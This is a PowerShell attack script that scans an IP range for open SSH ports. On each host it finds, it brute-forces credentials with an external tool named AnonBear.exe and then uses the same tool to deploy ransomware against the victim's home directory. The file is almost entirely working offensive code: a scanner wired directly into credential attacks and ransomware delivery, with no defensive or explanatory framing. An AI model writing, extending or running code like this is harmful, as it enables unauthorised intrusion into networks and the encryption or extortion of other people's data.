function Expand-IPRange {
    param ($range)
    $start, $end = $range -split '-'
    $startIP = [System.Net.IPAddress]::Parse($start).GetAddressBytes()
    $endIP = [System.Net.IPAddress]::Parse($end).GetAddressBytes()
    [Array]::Reverse($startIP)
    [Array]::Reverse($endIP)
    $startInt = [BitConverter]::ToUInt32($startIP, 0)
    $endInt = [BitConverter]::ToUInt32($endIP, 0)

    $ips = @()
    for ($i = $startInt; $i -le $endInt; $i++) {
        $bytes = [BitConverter]::GetBytes($i)
        [Array]::Reverse($bytes)
        $ips += [System.Net.IPAddress]::new($bytes)
    }
    return $ips
}

function Expand-Ports {
    param ($portInput)
    $ports = @()
    foreach ($p in $portInput -split ',') {
        if ($p -match '-') {
            $range = $p -split '-'
            $ports += ($range[0]..$range[1])
        } else {
            $ports += [int]$p
        }
    }
    return $ports
}

function pscan {
    param (
        [Parameter(Mandatory = $true)][string]$t,
        [Parameter(Mandatory = $true)][string]$p
    )
    if ($t -match "-") {
        $hosts = Expand-IPRange -range $t
    } else {
        $hosts = @($t)
    }

    $ports = Expand-Ports -portInput $p

    foreach ($h in $hosts) {
        foreach ($port in $ports) {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $conn = $tcp.ConnectAsync($h, $port)

            for ($i = 0; $i -lt 10; $i++) {
                if ($conn.IsCompleted) { break }
                Start-Sleep -Milliseconds 1
            }
            $tcp.Close()

            if ($conn.Status -eq "RanToCompletion") {
                # Remove Later
                $status = "Open"
                $color = "Green"
                $hostPart = "{0,-15} tcp/{1,-5} - " -f $h, $port
                Write-Host "$hostPart$status" -ForegroundColor $color
                # Insert bruteforce SSH here. aka run AnonBear with ssh_bf flag
                #Start-Process -FilePath AnonBear.exe -ArgumentList [remote, $h, x:x, ssh_bf]
                $cred = & .\AnonBear.exe remote $h x:x ssh_bf
                $parts = $cred -split ":", 2  # Split into two parts only
                $usern = $parts[0].Trim()

                # Found, use Anonbear for remote ransomware
                $output = & .\AnonBear.exe remote $h $cred ransom "/home/$usern/"
            }
        }
    }
}

$filePath = "C:\Windows\Temp\schedule.txt"

if (Test-Path $filePath) {
    Write-Host "Please Prearare credentials for BF"
    exit
}

pscan -t "192.168.8.110-192.168.8.120" -p "22"

